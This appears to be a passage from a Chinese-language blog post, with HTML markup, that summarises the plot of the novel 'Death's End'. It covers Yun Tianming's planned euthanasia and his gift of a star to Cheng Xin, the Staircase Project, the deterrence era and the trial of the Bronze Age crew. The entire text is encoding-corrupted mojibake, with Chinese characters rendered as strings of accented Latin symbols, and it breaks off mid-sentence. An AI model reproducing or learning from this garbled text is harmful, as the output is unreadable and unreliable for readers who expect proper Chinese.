æ­»å°±æ˜¯æˆ‘æ´»ã€‚ä»é€ƒäº¡ä¸»ä¹‰ï¼Œåˆ°æ³°å‹’å’Œé›·è¿ªäºšå…¹è¦ä»¥æ€æ­»è‡ªå·±äººä¸ºä»£ä»·ï¼Œå»å¨æ…‘ä¸‰ä½“äººï¼›å†åˆ°ç½—è¾‘æ€•å…¬ä¼—çŸ¥é“é»‘æš—æ£®æ—æ³•åˆ™åå¤§å®¶åå¯¹è‡ªå·±çš„è®¡åˆ’æ‰€ä»¥ä¸æ•¢å…¬å¸ƒï¼Œè¿™äº›æˆ–è®¸æƒ³å‘Šè¯‰æˆ‘ä»¬ï¼Œå¤§å¤šæ•°äººéƒ½æ˜¯è‡ªç§çš„ï¼Œæ•´ä¸ªæ•…äº‹æ— è®ºæ˜¯å¶æ–‡æ´çš„æ‚”æ‚Ÿï¼Œè¿˜æ˜¯ç½—è¾‘çš„æˆé•¿ï¼Œåˆæˆ–æ˜¯äººç±»ä»ç—›è‹¦çš„åçœï¼Œè¿™äº›éƒ½ä»¿ä½›åœ¨å‘Šè¯‰æˆ‘ä»¬ï¼Œç—›è‹¦æ˜¯æˆé•¿çš„å‚¬åŒ–å‰‚ã€‚</p><h3 id="æ­»ç¥æ°¸ç”Ÿ-ä¸Š"><a href="#æ­»ç¥æ°¸ç”Ÿ-ä¸Š" class="headerlink" title="æ­»ç¥æ°¸ç”Ÿ ä¸Š"></a>æ­»ç¥æ°¸ç”Ÿ ä¸Š</h3><p>&emsp;&emsp;è¿™ä¸ªæ•…äº‹è¦ä»ä¸€ä¸ªå«äº‘å¤©æ˜çš„äººå¼€å§‹è¯´èµ·ã€‚åœ¨ä»¥å‰çš„å±æœºçºªå…ƒ4å¹´ï¼Œé‚£ä¸ªæ—¶å€™çš„äººä»¬å¿ƒæƒ…å¾ˆå¤æ‚ï¼Œå¤–æ˜Ÿäºº400å¹´åä¼šæ¥ä¾µç•¥åœ°çƒè¿™ä¸ªæ¶ˆæ¯ï¼Œåœ¨é‚£ä¼šå¯æ˜¯ä¸€ä¸ªæ—¢æ–°é²œåˆå¯æ€•åˆåŠ²çˆ†çš„æ¶ˆæ¯ï¼Œå„ä¸ªåª’ä½“éƒ½åœ¨é“ºå¤©ç›–åœ°çš„æŠ¥é“è¿™ä»¶äº‹æƒ…ã€‚ä¸è¿‡åœ¨äº‘å¤©æ˜çœ¼é‡Œï¼Œä»€ä¹ˆä¸‰ä½“äººå››ç™¾å¹´åä¼šä¾µç•¥åœ°çƒï¼Œé‚£éƒ½ä¸æ˜¯äº‹å„¿ï¼Œå› ä¸ºä»¥ä»–çš„ç—…æƒ…ï¼Œæ˜å¹´çš„äº‹éƒ½ä¸ç”¨ä»–æ“å¿ƒäº†ã€‚ä»–çš„èº«è¾¹æ²¡æœ‰å‡ ä¸ªäº²æˆšï¼Œå…¶ä¸­ä»–çš„å§å§è¿˜æ€»æƒ³è®©ä»–æ—©ç‚¹å®‰ä¹æ­»ï¼Œé‚£æ—¶å€™ï¼Œæ²»ç–—ç»ç—‡å°±æ˜¯ä¸ªèŠ±é’±çš„æ— åº•æ´ï¼Œå¯¹äºæ‹–å®¶å¸¦å£è¿˜æ²¡ä¹°æˆ¿å­çš„å§å§æ¥è¯´ï¼Œå¼Ÿå¼Ÿäº‘å¤©æ˜æ—©ç‚¹æ­»å¥¹è¿˜èƒ½ä»çˆ¶äº²é‚£æ‹¿åˆ°ä¸å°‘é—äº§ã€‚äº‘å¤©æ˜ä¹Ÿå¾ˆè¯†è¶£ï¼Œä¹Ÿä¸æƒ³å—ç½ªã€‚æƒ³ç€ï¼Œå°±è¿™ä¸¤å¤©å‡†å¤‡å®‰ä¹æ­»å§ã€‚</p><p>&emsp;&emsp;å°±åœ¨ä»–æƒ³ç€å®‰ä¹æ­»çš„è¿™ä»¶äº‹å„¿çš„æ—¶å€™ï¼Œäº‘å¤©æ˜çš„åŒå­¦èƒ¡æ–‡ï¼Œå¸¦ç€åˆ›ä¸šæˆåŠŸçš„å–œæ‚¦æ‰¾åˆ°äº†äº‘å¤©æ˜ã€‚èƒ¡æ–‡çš„å…¬å¸ä¸»è¦æ˜¯å–é¥®æ–™çš„ï¼Œèƒ¡æ–‡èƒ½æ¥æ‰¾äº‘å¤©æ˜å¹¶ä¸æ˜¯ä»–ä»¬ä¹‹é—´å…³ç³»æœ‰å¤šå¥½ï¼Œè€Œæ˜¯èƒ¡æ–‡å–é¥®æ–™èƒ½æˆåŠŸï¼Œæ˜¯å› ä¸ºï¼Œäº‘å¤©æ˜çš„ä¸€ä¸ªç‚¹å­ã€‚è¿™ä¸ªç‚¹å­æ¥è‡ªäºäº‘å¤©æ˜å¯¹é¥®æ–™ç‹¬ç‰¹çš„çˆ±å¥½ï¼Œè¿™ä¸ªçˆ±å¥½å°±æ˜¯ï¼Œåœ¨çŸ¿æ³‰æ°´é‡Œå¡é‡è‰å–ã€‚èƒ¡æ–‡å½“åœºç»™äº†äº‘å¤©æ˜ä¸‰ç™¾ä¸‡ï¼Œè¿™ç¬”é’±å¯¹äº‘å¤©æ˜æ¥è¯´å¯æœ‰å¯æ— ï¼Œäº‘å¤©æ˜æœ¬æƒ³æ‹’ç»ï¼Œä½†èƒ¡æ–‡éå¸¸åšæŒï¼Œæ— å¥ˆä¹‹ä¸‹äº‘å¤©æ˜æ‰æ”¶ä¸‹äº†è¿™ç¬”å·¨æ¬¾ã€‚æ²¡å¤šä¹…ï¼Œäº‘å¤©æ˜è¿˜æ˜¯å†³å®šå®‰ä¹æ­»ï¼Œä»–çš„ç—…å·²ç»é‡åˆ°äº”ç¦äº«å—è¿™300ä¸‡äº†ã€‚è¿™ç¬”å·¨æ¬¾ä»–å¹¶ä¸æ‰“ç®—ç•™ç»™å§å§ï¼Œæ¯•ç«Ÿäº‘å¤©æ˜å·²ç»å¦‚å§å§æ‰€æ„¿ï¼Œèµ¶ç´§å»é˜ç‹çˆ·é‚£æŠ¥é“äº†ã€‚æ­¤æ—¶ï¼Œä»–çªç„¶çµå…‰ä¸€é—ªï¼Œäº‘å¤©æ˜å†³å®šç”¨è¿™ç¬”é’±ï¼Œç»™ä»–å¤§å­¦é‡Œæš—æ‹çš„ç¨‹å¿ƒé€ä¸€é¢—æ˜Ÿæ˜Ÿï¼Œä¸€é¢—çœŸæ­£çš„æ˜Ÿæ˜Ÿã€‚</p><p>&emsp;&emsp;é‚£å»å“ªä¹°ä¸€é¢—æ˜Ÿæ˜Ÿå‘¢ï¼Ÿè¿™æ˜¯è”åˆè‚¡å±•å¼€äº†ä¸€é¡¹ç¾¤æ˜Ÿè®¡åˆ’ï¼Œä¸»è¦çš„ç›®çš„ï¼Œæ˜¯éª—é’±ã€‚ã€‚ã€‚å¯¹å¤–å«ç­¹æ¬¾ã€‚ä»–ä»¬æ‹å–å¤ªé˜³ç³»å¤–çš„éƒ¨åˆ†æ’æ˜Ÿæ‰€æœ‰æƒï¼Œä¹°åˆ°äº†ï¼Œåˆ™ä¼šå¾—åˆ°ä¸€å¼ çº¸ï¼Œä¸Šé¢æ ‡æ˜ä½ çš„åˆæ³•æ‰€æœ‰æƒã€‚æ™šä¸Šçš„æ—¶å€™ä½ å°±å¯ä»¥æœ›ç€è¿™é¢—æ˜Ÿæ˜Ÿï¼Œå¿ƒç†æš—çˆ½ï¼Œå“ˆå“ˆï¼Œè¿™é¢—æ˜Ÿæ˜Ÿæ˜¯æˆ‘çš„äº†ã€‚ç„¶åå°±æ²¡ä»€ä¹ˆä¹±ç”¨äº†ã€‚å¦‚æœä½ æƒ³å»é‚£é‡Œï¼Œä¸å¥½æ„æ€ï¼Œä¸å¯èƒ½ã€‚æœ€è¿‘çš„æ’æ˜Ÿéƒ½æœ‰ä¸€ç™¾å¤šå…‰å¹´çš„è·ç¦»ï¼Œæ‰€ä»¥è¿™ä¸ªè®¡åˆ’ï¼Œå¼€å§‹æ—¶å°±ç»“æŸäº†ï¼Œæ€»å…±ä¹Ÿæ²¡å–å‡ºå»å¤šå°‘é¢—ã€‚ä¸è¿‡æœ‰æ²¡æœ‰ç”¨å¯¹äºäº‘å¤©æ˜ç°åœ¨æ¥è¯´å·²ç»ä¸é‡è¦äº†ï¼Œä»–ä»èƒ¡æ–‡é‚£è¦åˆ°äº†ç¨‹å¿ƒå¾—ä¸ªäººèµ„æ–™ï¼ŒèŠ±äº†ä¸‰ç™¾ä¸‡ï¼ŒåŒ¿åä¹°äº†ä¸€é¢—æ’æ˜Ÿé€ç»™ç¨‹å¿ƒã€‚ä¸ç¦æ„Ÿå¹ï¼Œäº‘å¤©æ˜çœŸæ˜¯ä¸ªæµªæ¼«çš„äººå•Šã€‚ç¬¬äºŒå¤©ï¼Œäº‘å¤©æ˜å¼€å§‹æ¥å—å®‰ä¹æ­»ã€‚æ­£å½“ä»–è¦æ‘ä¸‹æœ€åçš„ç¡®è®¤æŒ‰é’®æ—¶ï¼Œç¨‹å¿ƒå¸¦ç€äººçªç„¶å‡ºç°ã€‚ç¨‹å¿ƒå¯¹ä»–è¯´å‡ºçš„ç¬¬ä¸€å¥è¯éå¸¸å‡ºä¹æ„æ–™ï¼Œå¤©æ˜ï¼Œä½ çŸ¥é“ä¹ˆï¼Œå®‰ä¹æ­»æ³•æ˜¯ä¸ºä½ é€šè¿‡çš„ã€‚ </p><p>&emsp;&emsp;è¿™è¯å°±è¦ä»é˜¶æ¢¯è®¡åˆ’è¯´èµ·æ¥ï¼Œå½“æ—¶ç¨‹å¿ƒåœ¨æƒ…æŠ¥å±€å·¥ä½œï¼Œå±€é•¿å«ç»´å¾·ï¼Œæ˜¯ä¸€ä½é›·å‰é£è¡Œçš„å…³é”®äººç‰©ï¼Œä»–æœ‰ä¸€å¥å¹¿ä¸ºäººçŸ¥çš„å£å·ï¼šå‰è¿›ï¼Œå‰è¿›ï¼Œä¸æ‹©æ‰‹æ®µçš„å‰è¿›ã€‚ç»´å¾·æƒ³å‘å°„ä¸€æšé€Ÿåº¦è¾¾åˆ°ç™¾åˆ†ä¹‹ä¸€å…‰é€Ÿçš„æ¢æµ‹å™¨ï¼Œå»è·å¾—ä¸‰ä½“èˆ°é˜Ÿçš„æƒ…æŠ¥ï¼Œåœ¨è¿™æ—¶ï¼Œé€ ä¸€æšç™¾åˆ†ä¹‹ä¸€å…‰é€Ÿçš„æ¢æµ‹å™¨æ˜¯ä¸å¤§ç°å®çš„ã€‚ä½†ç¨‹å¿ƒæå‡ºäº†ä¸€ä¸ªè®¾æƒ³ï¼Œé€ å‡ºä¸€æšåªæœ‰è¾å°„å¸†çš„å°å‹æ¢æµ‹å™¨ï¼Œå¹¶åœ¨è¾å°„å¸†çš„èˆªè¡Œè½¨é“å¸ƒç½®æ ¸å¼¹ï¼Œæ¯ä¸€æ¬¡æ ¸å¼¹çˆ†ç‚¸éƒ½ä¼šä½¿é£èˆ¹åŠ é€Ÿï¼Œè¿™ä¸ªè¿‡ç¨‹ï¼Œå¾ˆåƒåœ¨æ”€ç™»é˜¶æ¢¯ï¼Œè¯¥è®¡åˆ’ï¼Œè¢«å‘½åä¸ºé˜¶æ¢¯è®¡åˆ’ã€‚è¿™ä¸ªè®¡åˆ’çš„è´Ÿè´£äººï¼Œæ­£å¼ç¨‹å¿ƒï¼Œè¿™æšæ¢æµ‹å™¨å¿…é¡»éå¸¸çš„è½»ï¼Œç”±äºæŠ€æœ¯çš„é™åˆ¶ï¼Œå¯¼è‡´æ¢æµ‹å™¨å°åˆ°åªèƒ½æ”¾å…¥ä¸€ä¸ªè¢«æ€¥å†»çš„äººè„‘ï¼Œé˜¶æ¢¯è®¡åˆ’çœŸæ˜¯æ²¡æœ‰åŠæ³•çš„åŠæ³•ï¼Œå¤§å®¶åªèƒ½é€‰æ‹©ç›¸ä¿¡ä¸‰ä½“äººæœ‰èƒ½åŠ›æŠŠä¸€é¢—äººè„‘è¿˜åŸæˆä¸€ä¸ªäººï¼Œå¹¶ä¸”ä»–ä»¬æ„¿æ„å»è¿™ä¹ˆåšã€‚è¿™ç§è¡Œä¸ºæ— å¼‚äºèµŒåšï¼Œä¸”å¤±è´¥ç‡å¾ˆé«˜ï¼Œä½†åªè¦æˆåŠŸï¼Œåªè¦æœ‰ä¸€ä¸ªäººèƒ½è¿›å…¥ä¸‰ä½“èˆ°é˜Ÿçš„å†…éƒ¨ï¼Œå°±ä¼šå¼•èµ·æ— é™çš„å¯èƒ½æ€§ã€‚ç¨‹å¿ƒåœ¨æ‰§è¡Œè¿™ä¸€è®¡åˆ’æ—¶ï¼Œå¾—çŸ¥æœ‰äººåŒ¿åé€ç»™äº†è‡ªå·±ä¸€é¢—æ˜Ÿæ˜Ÿï¼Œè¿™å¯¹ä»–æ¥è¯´æ˜¯ä¸€ä¸ªå·¨å¤§çš„æƒŠå–œã€‚æ­¤åˆ»çš„å¥¹é™·å…¥äº†ä»æœªæœ‰è¿‡çš„å¹¸ç¦æ„Ÿã€‚</p><p>&emsp;&emsp;é˜¶æ¢¯è®¡åˆ’æ­£åœ¨ç´§é”£å¯†é¼“çš„è¿›è¡Œç€ã€‚ä½†ç”¨è°çš„å¤§è„‘æˆäº†é—®é¢˜ï¼Œåœ¨ç¤¾ä¼šé“å¾·çš„å‹åŠ›ä¸‹ï¼Œè¿™ä¸ªäººåªèƒ½ä»èº«æ‚£ç»ç—‡å¹¶ä¸”æ„¿æ„å®‰ä¹æ­»çš„äººä¸­é€‰ï¼Œè€Œä¸”è¿™ä¸ªäººçš„èµ„å†è¦å¤Ÿä¹Ÿæ„¿æ„è¿™ä¹ˆåšã€‚ç¨‹å¿ƒåœ¨ä¸€æ¬¡å’ŒåŒå­¦çš„èŠå¤©ä¸­ï¼Œå¾—çŸ¥ä»¥å‰çš„åŒå­¦äº‘å¤©æ˜ï¼Œèº«æ‚£ç»ç—‡æ—©å·²æ—¶æ—¥æ— å¤šï¼Œç¨‹å¿ƒæ²¡æœ‰å¤šæƒ³ï¼Œä¾¿æŠŠå®ƒçº³å…¥äº†äººé€‰ä¹‹ä¸­ï¼Œéšåä¾¿æœ‰äº†ç¨‹å¿ƒé˜»æ­¢äº‘å¤©æ˜å®‰ä¹æ­»çš„é‚£ä¸€å¹•ã€‚</p><p>&emsp;&emsp;äº‘å¤©æ˜å¾—çŸ¥äº†è¿™æ¥é¾™å»è„‰åï¼Œæ¥å—äº†å¥³ç¥çš„è¯·æ±‚ï¼ŒåŠ å…¥äº†é˜¶æ¢¯è®¡åˆ’ã€‚å½“äº‘å¤©æ˜çš„å¤§è„‘è¢«å–å‡ºåï¼Œç¨‹å¿ƒæ‰å¾—çŸ¥é‚£é¢—æ˜Ÿæ˜Ÿæ­£å¼äº‘å¤©æ˜é€çš„ï¼Œæ­¤æ—¶å¥¹çªç„¶æ„è¯†åˆ°è‡ªå·±åšäº†ä»€ä¹ˆã€‚å› ä¸ºç­‰å¾…äº‘å¤©æ˜çš„å¯èƒ½æ˜¯æ— å°½å™©æ¢¦ã€‚å‡å¦‚ä¸‰ä½“äººçœŸçš„æ•è·äº†äº‘å¤©æ˜çš„å¤§è„‘ã€‚åå¤è™å¾…ä¹Ÿä¸æ˜¯æ²¡æœ‰å¯èƒ½ã€‚é˜¶æ¢¯è®¡åˆ’å¼€å§‹äº†ï¼Œ ä½†ç™¾å¯†ç»ˆæœ‰ä¸€ç–ï¼Œæ¢æµ‹å™¨åç¦»äº†èˆªçº¿ï¼Œé£å‘äº†æ— å°½çš„æ·±ç©ºã€‚æƒ…æŠ¥å±€çš„é¢†å¯¼ä»¬é€‰ä¸­ç¨‹å¿ƒå†¬çœ ï¼Œåˆ°æœªæ¥ç»§ç»­è·Ÿè¿›é˜¶æ¢¯è®¡åˆ’ã€‚å¸Œæœ›èƒ½æœ‰å¥‡è¿¹å‘ç”Ÿã€‚</p><p>&emsp;&emsp;ç½—è¾‘åˆ©ç”¨é»‘æš—æ£®æ—æ³•åˆ™æ‹¯æ•‘äº†åœ°çƒåï¼Œäººä»¬ä»æ­¤è¿›å…¥äº†å¨æ…‘çºªå…ƒã€‚ä¸‰ä½“äººåœ¨è¿™ä¸ªå¹´ä»£ï¼Œçœ‹ä¼¼è·Ÿäººç±»æ˜¯ä½ å¥½æˆ‘å¥½å¤§å®¶å¥½ã€‚äººä»¬æ„Ÿè§‰ï¼Œä¸‰ä½“äººè§£é™¤äº†å¯¹åœ°çƒçš„ç§‘æŠ€å°é”ï¼Œå¹¶ç»†è‡´å…¥å¾®ä¸åŒå…¶çƒ¦çš„ä¼ æˆç§‘å­¦ã€‚æœ‰æ—¶è‡ªå·±è¿˜è¢«ä¸‰ä½“äººå«Œå¼ƒå­¦å¾—æ…¢ï¼Œè¢«å‚¬ç€å¿«ç‚¹å­¦ã€‚äººä»¬è§‰å¾—ï¼Œè‡ªå·±ä¸€ä¸‹å­è·å¾—äº†è¢«å‹æŠ‘å‡ ä¸ªä¸–çºªçš„çŸ¥è¯†ã€‚</p><p>&emsp;&emsp;ä¸‰ä½“äººè¿˜å¸®åŠ©äººç±»å»ºé€ äº†å¼•åŠ›æ³¢å¤©çº¿ï¼Œå’Œå¼•åŠ›æ³¢é£èˆ¹ï¼Œä¸‡æœ‰å¼•åŠ›å·ã€‚æ¥å¸®åŠ©äººç±»åˆ©ç”¨è¿™äº›å·¥å…·å¨æ…‘è‡ªå·±ã€‚äººä»¬éœ€è¦å»ºé€ å¼•åŠ›æ³¢å‘å°„è£…ç½®ï¼Œæ˜¯å› ä¸ºç”¨å¼•åŠ›æ³¢å‘å®‡å®™å‘å°„ä¿¡æ¯ï¼Œæ¯”äººç±»ä¹‹å‰ç”¨çš„ä»»ä½•æ‰‹æ®µéƒ½é è°±æœ‰æ•ˆã€‚å½“åˆäººç±»èˆ°é˜Ÿè¢«æ°´æ»´å›¢ç­ï¼Œåœ¨æˆ˜åœºä¸Šï¼Œåªæœ‰é‡å­å·å’Œé’é“œæ—¶ä»£å·ï¼Œè¿™ä¸¤è‰˜æˆ˜èˆ°æˆåŠŸé€ƒç¦»ï¼Œç”±äºèµ„æºæœ‰é™ï¼Œé’é“œæ—¶ä»£å·çªè¢­äº†é‡å­å·ã€‚å¸¦ç€é‡å­å·çš„ç‰©èµ„é£å¾€äº†å¦ä¸€è¾¹ï¼Œç»è¿‡æ¼«é•¿çš„ä¸€æ®µæ—¶é—´ï¼Œé’é“œæ—¶ä»£å·è¿”èˆªäº†ï¼Œç°åœ¨é£èˆ¹ä¸Šçš„äººå¯ä»¥ç”¨è‚‰çœ¼çœ‹åˆ°åœ°çƒäº†ã€‚ä»–ä»¬æ¿€åŠ¨åœ°å–Šç€ï¼Œå›å®¶äº†ï¼Œå›å®¶äº†ï¼ä»–ä»¬å¹»æƒ³ç€å›åˆ°åœ°çƒä¸Šå®‰é€¸çš„ç”Ÿæ´»ï¼Œå’Œè¢«äººå´‡æ‹œçš„æ„Ÿè§‰ã€‚</p><p>&emsp;&emsp;ä¹‹å‰ï¼Œä»–ä»¬æ”¶åˆ°äº†ä¸€æ¡æ¶ˆæ¯ï¼Œè¢«å‘ŠçŸ¥ï¼Œäººç±»å¯¹ä¸‰ä½“ä¸–ç•Œçš„å¨æ…‘ï¼Œå·²ç»æˆåŠŸå»ºç«‹ï¼Œè®©ä»–ä»¬å°½å¿«è¿”èˆªã€‚ä¸€å¼€å§‹æ²¡äººä¿¡ï¼Œåæ¥æ™ºå­åœ¨é’é“œæ—¶ä»£å·ä¸Šå±•å¼€ï¼Œå¹¶å»ºç«‹äº†é€šä¿¡ï¼Œè¿™æ—¶é’é“œæ—¶ä»£å·ä¸Šçš„äººæ‰ä¿¡äº†ã€‚å¹¶ä¸”ä»–ä»¬å¾—çŸ¥ï¼Œè‡ªå·±å·²ç»æˆä¸ºäº†äººä»¬çš„è‹±é›„ï¼Œå…¨ä¸–ç•Œçš„äººä»¬éƒ½åœ¨ç›¼æœ›ç€ä»–ä»¬å›å½’ï¼Œé’é“œæ—¶ä»£å·çš„äººå›åˆ°å¤ªç©ºæ¸¯åï¼Œæˆ˜èˆ°ä¸Šçš„äººï¼Œçœ‹åˆ°äººå±±äººæµ·ï¼Œéƒ½åœ¨ä¸ºä»–ä»¬å¿˜æƒ…çš„æ¬¢å‘¼ç€ã€‚å½“é’é“œæ—¶ä»£å·ä¸Šæ‰€æœ‰äººéƒ½ç¦»èˆ°åï¼Œçªç„¶ä¸€ç‰‡å¯‚é™ï¼Œè¿æ¥ä»–ä»¬çš„äººå½“ä¸­æœ‰ä¸€ä½ä¸Šæ ¡ï¼Œå¼€å£è¯´äº†ä¸€ç•ªè¯ï¼Œå¤§è‡´å†…å®¹å¦‚ä¸‹ï¼šä½ ä»¬å·²è¢«å¼€é™¤äº†å†›ç±ï¼Œä½ ä»¬å¸¦æ¥çš„è€»è¾±ï¼Œæ°¸è¿œæ— æ³•è¢«æŠ¹ç­ï¼Œä½ ä»¬çš„äº²äººä¸æƒ³è§åˆ°ä½ ä»¬å‘¢ï¼Œä»–ä»¬ä»¥ä½ ä»¬ä¸ºè€»ï¼Œä»–ä»¬æ¨ä½ ä»¬ï¼Œä½ ä»¬å°†è¢«ç§»äº¤åˆ°å¸æ³•ç³»ç»Ÿã€‚</p><p>&emsp;&emsp;è¯´å®Œåï¼Œå¤§æ‰¹æ­¦è£…éƒ¨é˜Ÿå‡ºç°ï¼Œé€®æ•äº†ä»–ä»¬ã€‚ç½ªåæ˜¯ä¸€çº§è°‹æ€å’Œåäººç±»ç½ªã€‚åœ¨å®¡åˆ¤ä¸­å¤§å®¶æ‰çŸ¥é“ï¼Œåœ¨å½“æ—¶æ²¡æœ‰é€€è·¯çš„å¤ªç©ºé‡Œï¼Œé’é“œæ—¶ä»£å·çš„äººä»¬å»ºç«‹äº†é›†æƒç¤¾ä¼šï¼Œä¸ºäº†é›†ä½“ç”Ÿå­˜ï¼Œå‡ ä¹æ¯ä¸ªäººéƒ½æ”¾å¼ƒäº†è‡ªæˆ‘ï¼Œæˆä¸ºäº†é›†ä½“çš„ä¸€éƒ¨åˆ†ã€‚é’é“œæ—¶ä»£å·å‡†å¤‡å¯¹å¦ä¸€è‰˜æˆ˜èˆ°å‘èµ·è¿›æ”»æ—¶ï¼Œæ›¾æœ‰ä¸€æ¬¡æŠ•ç¥¨ï¼Œèˆ°ä¸Š94%èµæˆæ”»å‡»ã€‚å½“ç”¨æ¬¡å£°æ³¢æ°¢å¼¹è§£å†³äº†é‡å­å·åï¼Œäººä»¬æŠŠä¸Šé¢çš„å°¸ä½“å…¨éƒ¨è¡¥å……è¿›äº†é£Ÿå“åº“å­˜ï¼Œæˆäº†èˆ¹å‘˜çš„é£Ÿç‰©ã€‚</p><p>&emsp;&emsp;æœ€åå®¡åˆ¤çš„ç»“æœæ˜¯ï¼Œ138äººæ— ç½ªï¼Œ6åé«˜çº§å†›å®˜ç»ˆèº«ç›‘ç¦ï¼Œå…¶ä½™çš„äººå‡è¢«åˆ¤åˆ‘ã€‚åˆ‘æœŸä»äºŒåå¹´è‡³ä¸‰ç™¾å¹´ä¸ç­‰ã€‚åœ¨ä»–ä»¬è¿›ç›‘ç‹±å‰ï¼Œæœ‰å‡ ä½é’é“œæ—¶ä»£å·ä¸Šçš„å†›å®˜ï¼Œè¢«å®ªå…µæŠ¼é€ç€æœ€åä¸€æ¬¡è¿›å…¥äº†ä»–ä»¬çš„æˆ˜èˆ°ï¼Œè¿›è¡Œä¸€äº›äº¤æ¥å·¥ä½œã€‚å…¶ä¸­æœ‰ä¸€ä½è¢«æŠ¼é€çš„å†›å®˜ï¼Œå²è€å¾·ï¼Œä»–åœ¨äº¤æ¥å®Œæˆæ—¶ï¼Œçªç„¶è¿›å…¥å¦ä¸€ä»¶æ“ä½œå®¤ï¼Œå¿«é€Ÿè°ƒå‡ºä¸€ä¸ªé€šä¿¡ç•Œé¢ï¼Œä»–è¯´é“ï¼Œé’é“œæ—¶ä»£å‘¼å«è“è‰²ç©ºé—´ï¼é’é“œæ—¶ä»£å‘¼å«è“è‰²ç©ºé—´ï¼å°±åœ¨æ­¤åˆ»ï¼Œä¸€æŸæ¿€å…‰ç©¿è¿‡ä»–ä»¬çš„èƒ¸è†›ï¼Œä»–ç”¨å°½æœ€åçš„ç”Ÿå‘½å–Šå‡ºä¸€å¥è¯ï¼šä¸è¦è¿”èˆªï¼è¿™é‡Œä¸æ˜¯å®¶ï¼</p><p>&emsp;&emsp;æœ¬æ¥è“è‰²ç©ºé—´å¥½è¿˜åœ¨çŠ¹è±«ä¸­ï¼Œå½“æ”¶åˆ°è¿™ä¸ªè­¦æŠ¥æ—¶ï¼Œå®ƒç«‹åˆ»å…¨åŠŸç‡åŠ é€Ÿï¼Œèƒ½é£å¤šè¿œé£å¤šè¿œã€‚ä¸ä¹…åä¸‡æœ‰å¼•åŠ›å·é£èˆ¹å¼€å§‹è¿½å‡»é€ƒè·‘çš„è“è‰²ç©ºé—´å·ï¼Œä¸ºä»€ä¹ˆè¦è¿½å‘¢ï¼Ÿå› ä¸ºå½“äººç±»å¾—çŸ¥é»‘æš—æ£®ç«‹æ³•åˆ™åï¼Œç‰¹åˆ«å®³æ€•è¢«å…¶ä»–å¤–æ˜Ÿæ–‡æ˜å‘ç°ï¼Œæ‰€ä»¥ï¼Œè¿½å‡»è“è‰²ç©ºé—´å·å¹¶å°†å…¶æ‘§æ¯ï¼Œæˆä¸ºäº†ä¸‡æœ‰å¼•åŠ›å·å½“å‰çš„é¦–è¦ä»»åŠ¡ã€‚ä¸‰ä½“äººæ´¾å‡ºäº†ä¸¤ä¸ªæ°´æ»´å»ååŠ©ä¸‡æœ‰å¼•åŠ›å·ã€‚</p><p>&emsp;&emsp;äººç±»æ–‡æ˜ä»ä¸‰ä½“äººé‚£å­¦åˆ°äº†è¶Šæ¥è¶Šå¤šçš„ä¸œè¥¿ï¼Œè€Œä¸‰ä½“äººä¹Ÿä»äººç±»ç’€ç’¨çš„æ–‡åŒ–ä¸­å­¦åˆ°äº†ä¸å°‘ã€‚å½“äººä»¬çŸ¥é“ï¼Œä¸‰ä½“äººå–œæ¬¢åœ°çƒæ–‡åŒ–æ—¶ï¼Œä¸€å¼€å§‹æ˜¯ä¸ç›¸ä¿¡çš„ï¼Œåæ¥ä¸‰ä½“äººç»™äººä»¬çœ‹äº†å¾ˆå¤šï¼Œè‡ªå·±æ¨¡ä»¿äººç±»æ–‡åŒ–çš„è‰ºæœ¯ä½œå“ï¼ŒåŒ…æ‹¬ç”µå½±ã€å°è¯´ã€ç»˜ç”»ç­‰ï¼Œè¿™äº›ä½œå“ï¼Œéƒ½æ˜¯ç”¨äººç±»ä½œä¸ºè§’è‰²ï¼Œç¯å¢ƒä¹Ÿéƒ½æ˜¯åœ°åŒºä¸Šçš„ã€‚è¿™æ—¶äººä»¬æ‰ç›¸ä¿¡ã€‚äººä»¬ç”¨AIå’Œä»¿ç”ŸæŠ€æœ¯ï¼Œå¸®æ™ºå­é€ äº†ä¸€ä¸ªèº«ä½“ï¼Œæ™ºå­æˆä¸ºäº†æœ‰èº¯ä½“çš„æœºå™¨äººï¼Œæ‘‡èº«ä¸€å˜æˆä¸ºäº†ä¸€ä½é­…åŠ›åº„é‡çš„æ—¥æœ¬å¥³äººã€‚</p><p>&emsp;&emsp;å¨æ…‘çºªå…ƒå…­åä¸€å¹´ï¼Œç¨‹å¿ƒä»å†¬çœ ä¸­è¢«å”¤é†’ï¼Œä½†å¹¶ä¸æ˜¯å› ä¸ºé˜¶æ¢¯è®¡åˆ’ï¼Œè€Œæ˜¯å› ä¸ºäº‘å¤©æ˜ä»ç»™ä»–çš„æ˜Ÿæ˜Ÿã€‚è¿™é¢—æ’æ˜Ÿè¢«å‘ç°å‘¨å›´è¿˜æœ‰ä¸¤ä¸ªè¡Œæ˜Ÿï¼Œå…¶ä¸­ä¸€ä¸ªä¸åœ°çƒååˆ†ç›¸ä¼¼ã€‚å‘ç°è¿™äº›çš„æ˜¯ä¸€åå«è‰¾AAçš„å¥³åšå£«ï¼Œä¸€ä½åƒé¸Ÿå„¿ä¸€æ ·è½»çµçš„å¥³å­©å­ã€‚ä»–åæ¥æˆä¸ºäº†ç¨‹å¿ƒå¾—å¥½å‹å’Œå¾—åŠ›åŠ©æ‰‹ã€‚</p><p>&emsp;&emsp;ç”±äºç°åœ¨äººä»¬å·²ç»å…·å¤‡äº†æ˜Ÿé™…è¿œèˆªçš„èƒ½åŠ›ï¼Œæ‰€ä»¥è¿™ä¸ªæ¶ˆæ¯ä¸€å‡ºï¼Œè¿™é¢—æ’æ˜Ÿçš„ä»·æ ¼é©¬ä¸Šå¼€å§‹é£å‡ã€‚è”åˆå›½å”¤é†’ç¨‹å¿ƒå°±æ˜¯ä¸ºäº†ä¹°ä¸‹è¿™é¢—æ˜Ÿæ˜Ÿã€‚ç¨‹å¿ƒå› ä¸ºè¿™ä¸ªæ˜Ÿæ˜Ÿå¼€å§‹å°æœ‰åæ°”ã€‚åˆšæ¥åˆ°æ–°ä¸–ç•Œçš„ç¨‹å¿ƒï¼Œè‡ªç„¶æ˜¯å¾ˆä¸é€‚åº”ï¼Œå°±åƒæ˜¯åˆ˜å§¥å§¥è¿›å¤§è§‚å›­ä¸€æ 